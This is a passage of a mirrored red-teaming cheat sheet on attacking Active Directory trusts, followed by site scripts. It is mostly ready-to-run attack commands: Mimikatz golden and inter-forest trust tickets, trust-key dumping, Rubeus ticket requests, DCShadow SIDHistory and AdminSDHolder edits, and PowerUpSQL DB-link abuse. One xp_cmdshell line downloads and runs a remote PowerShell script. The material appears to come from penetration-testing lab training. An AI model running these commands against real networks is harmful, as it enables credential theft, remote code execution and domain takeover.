+Invoke-Mimikatz -Command <span class="hljs-string">'"Kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:moneycorp.local  /ticket:trust_stealth_tkt.kirbi"'</span>
+
+
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="722" data-line-end="723"><strong>CASE II: Privilege Escalation from one forest to other Forest (SID Filtering is enabled for external and forest level trust)</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="724" data-line-end="729">
+<p class="has-line-data" data-line-start="724" data-line-end="725">STEP 1: Identify if there is trust between current domain and foreign forest</p>
+<pre><code class="has-line-data" data-line-start="727" data-line-end="729" class="language-powershell">Get-NetDomainTrust
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="729" data-line-end="735">
+<p class="has-line-data" data-line-start="729" data-line-end="730">STEP 2: Fetch the Trust Keys of the external or forest level trust</p>
+<pre><code class="has-line-data" data-line-start="732" data-line-end="735" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::lsa /patch"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::trust /patch"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="735" data-line-end="740">
+<p class="has-line-data" data-line-start="735" data-line-end="736">STEP 3: Use the Trust Key to craft a TGT</p>
+<pre><code class="has-line-data" data-line-start="738" data-line-end="740" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /user:administrator  /domain:organicsecurity.local /sid:S-1-5-21-223322223-11111111-538504511  /rc4:d98c9dc732432432432f58a /service:krbtgt /target:anotherdomain.local /ticket:apple_trust_tkt.kirbi"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="740" data-line-end="745">
+<p class="has-line-data" data-line-start="740" data-line-end="741">STEP 4: Inject the ticket back into the memory</p>
+<pre><code class="has-line-data" data-line-start="743" data-line-end="745" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::ptt eurocorp_trust_tkt.kirbi"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="745" data-line-end="751">
+<p class="has-line-data" data-line-start="745" data-line-end="746">STEP 5: Request a TGS for CIFS Service on the DC of AnotherForest Domain (Possible to create TGS for other service as well like HOST,RPCSS,LDAP etc)</p>
+<pre><code class="has-line-data" data-line-start="748" data-line-end="751" class="language-powershell">.\Rubeus.exe asktgs /ticket:eurocorp_trust_tkt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local  /dc:eurocorp-dc.eurocorp.local  /ptt
+
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="751" data-line-end="773">
+<p class="has-line-data" data-line-start="751" data-line-end="752">STEP 6: Further, we can scan the ACL of the AD Objects in another forest to identify any Foreign Group Membership and ACLs which may allow the user in current domain access to specific services in another domain:</p>
+<ul>
+<li class="has-line-data" data-line-start="753" data-line-end="758">
+<p class="has-line-data" data-line-start="753" data-line-end="754">Scenario 1: Local Group Membership - Find if the users from current domain is member of group in another forest/domain</p>
+<pre><code class="has-line-data" data-line-start="756" data-line-end="758" class="language-powershell">Get-NetLocalGroupMember &lt;server&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="758" data-line-end="765">
+<p class="has-line-data" data-line-start="758" data-line-end="759">Scenario 2: Foreign Group Membership - Find users from foreign domain having membership in current AD groups. They show in “ForeignSecurityPrincipals” container of domain</p>
+<pre><code class="has-line-data" data-line-start="761" data-line-end="765" class="language-powershell">Get-DomainObject -Domain organicsecurity.local -LDAPFilter <span class="hljs-string">'(ObjectClass=ForeignSecurityPrincipals)'</span>
+Get-DomainForeignGroupMember -Domain &lt;target.domain.fqdn&gt;
+Get-DomainForeignUser -Domain &lt;target.domain.fqdn&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="765" data-line-end="773">
+<p class="has-line-data" data-line-start="765" data-line-end="766">Scenario 3: Foreign ACL Principals - Find the ACEs applied on ad objects where the security identifier is not set to the domain being queried, or set to the domain you are currently having access.</p>
+<pre><code class="has-line-data" data-line-start="768" data-line-end="773" class="language-powershell">Get-DomainObjectACL -Domain &lt;domain.fqdn&gt;
+Get-DomainObjectAcl -Domain eurocorp.local | ?{<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-like</span> <span class="hljs-string">"S-1-5-21-234345438-14223333-702334436*"</span>} | select ObjectDN, ActiveDirectoryRights, AceType, SecurityIdentifier
+
+
+
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=773 data-line-end=774 ><a id="TrustAbuse__MSSQL_using_PowerUp_SQL_773"></a>TrustAbuse - MSSQL using PowerUp SQL</h1>
+<ul>
+<li class="has-line-data" data-line-start="775" data-line-end="780">
+<p class="has-line-data" data-line-start="775" data-line-end="776">Identifying all the MSSQL Database Servers in the current domain (searches domain by MSSQL SPN in computer object)</p>
+<pre><code class="has-line-data" data-line-start="778" data-line-end="780" class="language-powershell">Get-SQLInstanceDomain
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="780" data-line-end="785">
+<p class="has-line-data" data-line-start="780" data-line-end="781">Check if the current logged-on user has access to SQL Database</p>
+<pre><code class="has-line-data" data-line-start="783" data-line-end="785" class="language-powershell">Get-SQLConnectionTestThreaded
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="785" data-line-end="790">
+<p class="has-line-data" data-line-start="785" data-line-end="786">Gather More Information about the SQL Database (Only Accessible DBs)</p>
+<pre><code class="has-line-data" data-line-start="788" data-line-end="790" class="language-powershell">Get-SQLInstanceDomain | Get-SQLServerInfo
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="790" data-line-end="795">
+<p class="has-line-data" data-line-start="790" data-line-end="791">Invoke audit checks on the accessible DB Service to identify the vulnerabilities and misconfigurations</p>
+<pre><code class="has-line-data" data-line-start="793" data-line-end="795" class="language-powershell">Invoke-SQLAudit -Instance &lt;server_fqdn&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="795" data-line-end="800">
+<p class="has-line-data" data-line-start="795" data-line-end="796">Invoke automated abuse of the vulnerabilities</p>
+<pre><code class="has-line-data" data-line-start="798" data-line-end="800" class="language-powershell">Invoke-SQLEscalatePriv -Instance &lt;server_fqdn&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="800" data-line-end="805">
+<p class="has-line-data" data-line-start="800" data-line-end="801">Identify the DB Links</p>
+<pre><code class="has-line-data" data-line-start="803" data-line-end="805" class="language-powershell">Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local   
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="805" data-line-end="810">
+<p class="has-line-data" data-line-start="805" data-line-end="806">Execute commands using xp_cmdshell via DB Links</p>
+<pre><code class="has-line-data" data-line-start="808" data-line-end="810" class="language-powershell">Get-SQLServerLinkCrawl -Instance dcorp-mssql.organicsecurity.local  -Query <span class="hljs-string">"exec master..xp_cmdshell 'whoami'"</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="810" data-line-end="816">
+<p class="has-line-data" data-line-start="810" data-line-end="811">Gain Remote Shell using xp_cmdshell via DB Links</p>
+<pre><code class="has-line-data" data-line-start="813" data-line-end="815" class="language-powershell">Get-SqlServerLinkCrawl -Instance DCORP-MSSQL -Query <span class="hljs-string">'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring('</span><span class="hljs-string">'http://172.16.100.79/dakiya.ps1'</span><span class="hljs-string">')"'</span> | select instance,links,customquery | ft
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="816" data-line-end="826">
+<p class="has-line-data" data-line-start="816" data-line-end="817">Enumerating DB Links manually</p>
+<pre><code class="has-line-data" data-line-start="819" data-line-end="825" class="language-sql"><span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">master</span>.. sysservers;</span>
+<span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> openquery (<span class="hljs-string">"dcorp-sql1"</span>,<span class="hljs-string">'select * from master.. sysservers'</span>);</span>
+<span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> openquery (<span class="hljs-string">"dcorp-sql1"</span>,<span class="hljs-string">'select * from openquery ("dcorp-sql2",''select * from master..sysservers'')'</span>);</span>
+<span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> openquery (<span class="hljs-string">"dcorp-sql1"</span>,<span class="hljs-string">'select * from openquery ("dcorp-sql2",''select * from openquery ("pcorp-sql3.organicsecurity.local",''''select * from master.. sysservers'''')'')'</span>);</span>
+<span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> openquery (<span class="hljs-string">"dcorp-sql1"</span>,<span class="hljs-string">'select * from openquery ("dcorp-sql2",''select * from openquery ("pcorp-sql3.organicsecurity.local",''''select @@version'''')'')'</span>);</span>
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="826" data-line-end="832">
+<p class="has-line-data" data-line-start="826" data-line-end="827">Command to enable xp_cmdshell if not enabled:</p>
+<pre><code class="has-line-data" data-line-start="829" data-line-end="831" class="language-sql"><span class="hljs-operator"><span class="hljs-keyword">EXECUTE</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">1</span>;</span> 
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=832 data-line-end=833 ><a id="DC_shadow_832"></a>DC shadow</h1>
+<ul>
+<li class="has-line-data" data-line-start="834" data-line-end="845">
+<p class="has-line-data" data-line-start="834" data-line-end="835">Update Description, SIDHistory and GroupID</p>
+<pre><code class="has-line-data" data-line-start="837" data-line-end="845" class="language-powershell">lsadump::dcshadow /object:root01 /attribute:Description /value=<span class="hljs-string">"Hello from DCShadow"</span>
+
+lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">280534878</span>-<span class="hljs-number">1496970234</span>-<span class="hljs-number">700767426</span>-<span class="hljs-number">519</span>
+
+lsadump-dcshadow /object:student1 /attribute:primaryGroupID /value:<span class="hljs-number">519</span>
+
+lsadump::dcshadow /push
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="845" data-line-end="853">
+<p class="has-line-data" data-line-start="845" data-line-end="846">Modify ntSecurityDescriptor for AdminSDHolder to add full control to current user</p>
+<pre><code class="has-line-data" data-line-start="848" data-line-end="853" class="language-powershell">(<span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry ((<span class="hljs-string">"LDAP://CN=Admin 
+SDHolder,CN=System,DC=moneycorp,DC=local"</span>)).psbase.ObjectSecurity.sddl
+
+lsadump-dcshadow /object:CN=AdminSDHolder,CN=System,DC=organicsecurity,DC=local /attribute:ntSecurityDescriptor /value:&lt;modified ACL&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="853" data-line-end="859">
+<p class="has-line-data" data-line-start="853" data-line-end="854">Alternatively, we can use Set-DCShadowPermissions from Nishang</p>
+<pre><code class="has-line-data" data-line-start="856" data-line-end="859" class="language-powershell">  Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose
+
+
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=859 data-line-end=860 ><a id="References_859"></a>References</h1>
+<ul>
+<li class="has-line-data" data-line-start="861" data-line-end="862"><a href="https://www.pentesteracademy.com/activedirectorylab">https://www.pentesteracademy.com/activedirectorylab</a></li>
+<li class="has-line-data" data-line-start="862" data-line-end="863"><a href="https://www.alteredsecurity.com/adlab">https://www.alteredsecurity.com/adlab</a></li>
+<li class="has-line-data" data-line-start="863" data-line-end="864"><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
+<li class="has-line-data" data-line-start="864" data-line-end="865"><a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></li>
+<li class="has-line-data" data-line-start="865" data-line-end="866"><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></li>
+<li class="has-line-data" data-line-start="866" data-line-end="867"><a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</a></li>
+<li class="has-line-data" data-line-start="867" data-line-end="868"><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></li>
+<li class="has-line-data" data-line-start="868" data-line-end="869"><a href="https://blog.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">https://blog.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</a></li>
+</ul>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body></html>
+
+
+
+
+ 
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="vendor/purecounter/purecounter.js"></script>
+  <script src="vendor/aos/aos.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="vendor/typed.js/typed.min.js"></script>
+  <script src="vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script>
+    Prism.languages.bash = Prism.languages.extend('bash', {
+      'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
+    });
+  </script>
+  <script>
+    Prism.languages.powershell = Prism.languages.extend('powershell', {
+      'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
+    });
+  </script>
+
+  <script>
+    let allOpen = false; // Track the state of the dropdowns
+
+    function toggleIndex() {
+      const index = document.getElementById('index');
+      index.classList.toggle('open');
+    }
+
+    function toggleAll() {
+      const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
+      const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');
+
+      // Set the new state based on the current state
+      allOpen = !allOpen;
+
+      for (let i = 0; i < dropdownContainers.length; i++) {
+        const container = dropdownContainers[i];
+        const btn = buttons[i];
+        if (allOpen) {
+          container.style.display = 'block';
+          btn.classList.add('active');
+        } else {
+          container.style.display = 'none';
+          btn.classList.remove('active');
+        }
+      }
+    }
+
+    const dropdownBtns = document.getElementsByClassName("dropdown-btn");
+    for (let i = 0; i < dropdownBtns.length; i++) {
+      dropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const dropdownContent = this.nextElementSibling;
+        if (dropdownContent.style.display === "block") {
+          dropdownContent.style.display = "none";
+        } else {
+          dropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
+    for (let i = 0; i < nestedDropdownBtns.length; i++) {
+      nestedDropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const nestedDropdownContent = this.nextElementSibling;
+        if (nestedDropdownContent.style.display === "block") {
+          nestedDropdownContent.style.display = "none";
+        } else {
+          nestedDropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    setTimeout(function () {
+      var alert = document.querySelector('.alert-warning');
+      if (alert) {
+        var bootstrapAlert = new bootstrap.Alert(alert);
+        bootstrapAlert.close();
+      }
+    }, 7000); // 7 seconds
+
+    function removeHighlights(element) {
+      element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
+    }
+
+    function highlightTerm(element, term) {
+      const regex = new RegExp(`(${term})`, 'gi');
+      element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
+    }
+
+    document.getElementById("search-input").addEventListener("input", function () {
+      const searchTerm = this.value.toLowerCase();
+      const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
+      let anyMatch = false;
+
+      headings.forEach((heading) => {
+        const text = heading.textContent.toLowerCase();
+        const sectionContent = [];
+
+        // Get all sibling elements until the next heading
+        let sibling = heading.nextElementSibling;
+        while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
+          sectionContent.push(sibling);
+          sibling = sibling.nextElementSibling;
+        }
+
+        // Remove existing highlights
+        removeHighlights(heading);
+
+        // Only show headings and content that match the search term
+        if (text.includes(searchTerm)) {
+          heading.style.display = "";
+          sectionContent.forEach((elem) => (elem.style.display = ""));
+          if (searchTerm) {
+            highlightTerm(heading, searchTerm);
+          }
+
+          anyMatch = true;
+        } else {
+          // Hide non-matching headings and content
+          heading.style.display = "none";
+          sectionContent.forEach((elem) => (elem.style.display = "none"));
+        }
+      });
+
+      const noMatchMessage = document.getElementById("no-match-message");
+      if (!anyMatch) {
+        if (!noMatchMessage) {
+          const message = document.createElement("p");
+          message.id = "no-match-message";
+          message.className = "text-danger mt-3";
+          message.textContent = "No matches found.";
+          document.querySelector(".cheatsheet-content").appendChild(message);
+        }
+      } else if (noMatchMessage) {
+        noMatchMessage.remove();
+      }
+    });
+
+    function toggleSubmenu(event) {
+      event.preventDefault(); // Prevents navigation
+      const submenu = event.currentTarget.nextElementSibling;
+      const arrow = event.currentTarget.querySelector('.arrow');
+
+      submenu.classList.toggle('open'); // Toggle the submenu visibility
+      // Rotate the arrow based on whether the submenu is open
+      if (submenu.classList.contains('open')) {
+        arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
+      } else {
+        arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
+      }
+    }
+  </script>
+
+</body>
+
+
+<!-- Mirrored from www.emmanuelsolis.com/red_teaming.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:32 GMT -->
+</html>
